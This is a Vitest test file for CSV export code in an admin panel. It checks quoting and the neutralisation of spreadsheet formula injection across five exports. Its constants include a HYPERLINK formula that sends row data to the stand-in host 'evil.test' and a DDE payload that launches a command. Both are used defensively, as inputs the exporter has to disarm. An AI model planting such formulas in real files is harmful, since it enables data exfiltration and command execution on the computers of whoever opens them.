import { describe, expect, it } from "vitest";

import { csvCell, csvRow, toCsv } from "./csv";
import { buildUsersCsv } from "@/app/users/components/client";
import { buildPaymentsCsv } from "@/app/payments/components/client";
import { buildRenewalsCsv } from "@/app/renewals/components/client";
import { buildReferralRequestsCsv } from "@/app/referral-request/components/client";
import { buildIssuesCsv } from "@/app/reported-issues/components/client";

import type { EnhancedUserColumn } from "@/app/users/components/client";
import type { PaymentWithUser } from "@/app/payments/components/columns";
import type { PaymentWithUser as RenewalWithUser } from "@/app/renewals/components/columns";
import type { ReferralRequestResponse } from "@/app/referral-request/components/columns";
import type { IssueColumn } from "@/app/reported-issues/components/columns";

/**
 * An independent RFC 4180 reader, written from the spec rather than from
 * lib/csv.ts, so a round-trip proves the file is actually correct instead of
 * proving that two copies of the same mistake agree. Returns rows of fields.
 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quotedField = false;
  let inQuotes = false;
  let i = 0;

  const endField = () => {
    row.push(field);
    field = "";
    quotedField = false;
  };
  const endRow = () => {
    endField();
    rows.push(row);
    row = [];
  };

  while (i < text.length) {
    const c = text[i];

    if (inQuotes) {
      if (c === '"') {
        // A doubled quote inside a quoted field is one literal quote.
        if (text[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        inQuotes = false;
        i += 1;
        continue;
      }
      field += c;
      i += 1;
      continue;
    }

    if (c === '"' && field === "" && !quotedField) {
      quotedField = true;
      inQuotes = true;
      i += 1;
      continue;
    }
    if (c === ",") {
      endField();
      i += 1;
      continue;
    }
    if (c === "\r") {
      endRow();
      i += text[i + 1] === "\n" ? 2 : 1;
      continue;
    }
    if (c === "\n") {
      endRow();
      i += 1;
      continue;
    }
    field += c;
    i += 1;
  }

  if (field !== "" || row.length > 0) endRow();
  return rows;
}

/** Read a one-record CSV back as { header: value }. */
function parseSingleRecord(csv: string): Record<string, string> {
  const rows = parseCsv(csv);
  expect(rows).toHaveLength(2); // header + exactly one record, never more
  const [headers, values] = rows;
  expect(values).toHaveLength(headers.length);
  return Object.fromEntries(headers.map((h, i) => [h, values[i]]));
}

// --- the payloads both failure modes are made of -------------------------

/** Corrupts a row: the reader sees the field terminate at the inner quote. */
const EMBEDDED_QUOTE = 'Bob "The Bull"';
/** Executes on open: exfiltrates the row to an attacker-controlled URL. */
const FORMULA = '=HYPERLINK("https://evil.test/?d="&A1&B1,"Click")';
/** Shifts every later column on the row. */
const COMMA = "Smith, Jonathan";
/** Splits one record into two. */
const NEWLINE = "first line\nsecond line";
/** Looks numeric, is not: the classic DDE command payload. */
const DDE = "-2+3+cmd|' /C calc'!A0";

describe("parseCsv (the test's own reader)", () => {
  it("reads a quoted field containing quotes, commas and newlines", () => {
    expect(parseCsv('a,"x""y","p,q","r\ns"\r\n')).toEqual([
      ["a", 'x"y', "p,q", "r\ns"],
    ]);
  });

  it("splits records on CRLF, LF and bare CR alike", () => {
    expect(parseCsv("a,b\r\nc,d\ne,f\rg,h")).toEqual([
      ["a", "b"],
      ["c", "d"],
      ["e", "f"],
      ["g", "h"],
    ]);
  });
});

describe("csvCell: quoting, so the file round-trips", () => {
  it("leaves a value that needs no quoting alone", () => {
    expect(csvCell("plain")).toBe("plain");
  });

  it("doubles an embedded quote and wraps the field", () => {
    expect(csvCell(EMBEDDED_QUOTE)).toBe('"Bob ""The Bull"""');
  });

  it("wraps a value containing a comma", () => {
    expect(csvCell(COMMA)).toBe('"Smith, Jonathan"');
  });

  it("wraps a value containing a newline", () => {
    expect(csvCell(NEWLINE)).toBe('"first line\nsecond line"');
  });

  it("wraps a value containing a carriage return", () => {
    expect(csvCell("a\rb")).toBe('"a\rb"');
  });

  it("round-trips every awkward value through an independent reader", () => {
    const values = [EMBEDDED_QUOTE, COMMA, NEWLINE, "a\r\nb", '""', ","];
    expect(parseCsv(csvRow(values) + "\r\n")).toEqual([values]);
  });

  it("renders null and undefined as an empty field", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("stringifies numbers and booleans as the old exports did", () => {
    expect(csvRow([1, 0, true, false])).toBe("1,0,true,false");
  });
});

describe("csvCell: formula neutralisation, so the file does not execute", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "prefixes a value starting with %j so the cell renders as text",
    (lead) => {
      const cell = csvCell(`${lead}SUM(A1:A9)`);
      const [[value]] = parseCsv(cell + "\r\n");
      expect(value).toBe(`'${lead}SUM(A1:A9)`);
      expect(value.startsWith(lead)).toBe(false);
    }
  );

  it("neutralises the HYPERLINK exfiltration payload", () => {
    const [[value]] = parseCsv(csvCell(FORMULA) + "\r\n");
    expect(value).toBe(`'${FORMULA}`);
    expect(value.startsWith("=")).toBe(false);
  });

  it("neutralises and quotes at the same time, since one is not the other", () => {
    // The payload holds quotes and commas as well as a leading `=`. Getting
    // the quoting right is not a reason to skip the guard.
    const record = parseSingleRecord(
      toCsv([
        ["name"],
        [FORMULA],
      ])
    );
    expect(record.name).toBe(`'${FORMULA}`);
  });

  it("guards a bare dash, which Excel reads as a broken formula", () => {
    expect(csvCell("-")).toBe("'-");
  });

  it("guards the DDE payload, which only begins by looking numeric", () => {
    const [[value]] = parseCsv(csvCell(DDE) + "\r\n");
    expect(value).toBe(`'${DDE}`);
  });

  it.each(["-1-1", "-1e", "- 5", "--5", "-5 ", "+A1"])(
    "guards %j, which is not a complete numeric literal",
    (value) => {
      expect(csvCell(value)).toBe(`'${value}`);
    }
  );
});

describe("csvCell: the numeric exemption for a leading sign", () => {
  it.each(["-42.5", "-0", "-1234", "+7", "-1e3", "-1E-3", "-.5", "+0.25"])(
    "leaves %j alone, so a negative figure still SUMs in the sheet",
    (value) => {
      expect(csvCell(value)).toBe(value);
    }
  );

  it("leaves a negative number passed as a number alone", () => {
    expect(csvCell(-42.5)).toBe("-42.5");
  });
});

describe("toCsv", () => {
  it("joins records with CRLF and terminates the last one", () => {
    expect(toCsv([["a", "b"], ["c", "d"]])).toBe("a,b\r\nc,d\r\n");
  });

  it("keeps a field's own newline from splitting the record", () => {
    expect(parseCsv(toCsv([["h1", "h2"], [NEWLINE, "x"]]))).toEqual([
      ["h1", "h2"],
      [NEWLINE, "x"],
    ]);
  });
});

// --- the five real exports ------------------------------------------------

const userRecord = (value: string): EnhancedUserColumn => ({
  id: "u-1",
  name: value,
  email: value,
  role: "USER",
  createdAt: "2026-01-02 10:00 AM",
  updatedAt: "2026-01-03 10:00 AM",
  phone: "+1 555 0100",
  exnessId: value,
  exnessVerified: true,
  emailVerified: false,
  createdAtRaw: new Date("2026-01-02T10:00:00Z"),
  updatedAtRaw: new Date("2026-01-03T10:00:00Z"),
});

const paymentRecord = (value: string): PaymentWithUser => ({
  id: "p-1",
  amount: 199,
  currency: "USD",
  paymentMethod: "CREGIS",
  status: "SUCCESS",
  cregisId: "cg-1",
  amountPaid: 199,
  epayId: "ep-1",
  telegramLink: value,
  description: value,
  createdAt: new Date("2026-01-02T10:00:00Z"),
  updatedAt: new Date("2026-01-03T10:00:00Z"),
  utmSource: null,
  user: {
    id: "u-1",
    name: value,
    email: "user@example.test",
    phoneNumber: "+1 555 0100",
    country: "US",
  },
  package: { id: "pkg-1" },
});

const renewalRecord = (value: string): RenewalWithUser => ({
  ...paymentRecord(value),
  package: {
    id: "pkg-1",
    name: value,
    description: "Monthly",
    currentPrice: 199,
    duration: 30,
    currency: "USD",
  },
});

const referralRecord = (value: string): ReferralRequestResponse => ({
  id: 1,
  userId: 2,
  exnessId: value,
  status: "PENDING",
  createdAt: "2026-01-02T10:00:00Z",
  updatedAt: "2026-01-03T10:00:00Z",
  broker: "EXNESS",
  user: {
    id: 2,
    name: value,
    email: value,
    exnessId: value,
    exnessVerified: false,
  },
});

const issueRecord = (value: string): IssueColumn => ({
  id: 1,
  title: value,
  description: value,
  image: "https://cdn.example.test/a.png",
  userName: value,
  userEmail: "user@example.test",
  status: "OPEN",
  remarks: value,
  createdAt: "2026-01-02 10:00 AM",
  updatedAt: "2026-01-03 10:00 AM",
  createdAtRaw: new Date("2026-01-02T10:00:00Z"),
  updatedAtRaw: new Date("2026-01-03T10:00:00Z"),
});

/**
 * Each export, with the headers of the columns that carry user-controlled
 * text. Looked up by header name rather than index so the assertions survive a
 * column being added.
 */
const EXPORTS = [
  {
    panel: "users",
    build: (value: string) => buildUsersCsv([userRecord(value)]),
    userControlled: ["Name", "Email", "Exness ID"],
  },
  {
    panel: "payments",
    build: (value: string) => buildPaymentsCsv([paymentRecord(value)]),
    userControlled: ["user.name", "description", "telegramLink"],
  },
  {
    panel: "renewals",
    build: (value: string) => buildRenewalsCsv([renewalRecord(value)]),
    userControlled: ["user.name", "description", "package.name"],
  },
  {
    panel: "referral-request",
    build: (value: string) =>
      buildReferralRequestsCsv([referralRecord(value)]),
    userControlled: ["User Name", "User Email", "Account ID"],
  },
  {
    panel: "reported-issues",
    build: (value: string) => buildIssuesCsv([issueRecord(value)]),
    userControlled: ["Title", "Description", "Remarks", "User Name"],
  },
] as const;

describe.each(EXPORTS)("$panel CSV export", ({ build, userControlled }) => {
  it("round-trips a value holding an embedded quote", () => {
    const record = parseSingleRecord(build(EMBEDDED_QUOTE));
    for (const header of userControlled) {
      expect(record[header]).toBe(EMBEDDED_QUOTE);
    }
  });

  it("round-trips a value holding a comma without shifting later columns", () => {
    const record = parseSingleRecord(build(COMMA));
    for (const header of userControlled) {
      expect(record[header]).toBe(COMMA);
    }
  });

  it("round-trips a value holding a newline without splitting the record", () => {
    const record = parseSingleRecord(build(NEWLINE));
    for (const header of userControlled) {
      expect(record[header]).toBe(NEWLINE);
    }
  });

  it("neutralises a value starting with = so the sheet does not execute it", () => {
    const record = parseSingleRecord(build(FORMULA));
    for (const header of userControlled) {
      expect(record[header]).toBe(`'${FORMULA}`);
      expect(record[header].startsWith("=")).toBe(false);
    }
  });

  it("neutralises the DDE payload that only looks numeric", () => {
    const record = parseSingleRecord(build(DDE));
    for (const header of userControlled) {
      expect(record[header]).toBe(`'${DDE}`);
    }
  });

  it("emits no unguarded formula lead in any cell", () => {
    for (const payload of [EMBEDDED_QUOTE, FORMULA, COMMA, NEWLINE, DDE]) {
      for (const row of parseCsv(build(payload))) {
        for (const cell of row) {
          expect(/^[=+@\t\r]/.test(cell)).toBe(false);
        }
      }
    }
  });
});

describe("numeric columns survive the formula guard", () => {
  it("exports a negative payment amount as a number, not as text", () => {
    const refund = { ...paymentRecord("Ada"), amount: -199.5 };
    expect(parseSingleRecord(buildPaymentsCsv([refund])).amount).toBe("-199.5");
  });

  it("exports a negative renewal amount as a number, not as text", () => {
    const refund = { ...renewalRecord("Ada"), amount: -50 };
    expect(parseSingleRecord(buildRenewalsCsv([refund])).amount).toBe("-50");
  });
});
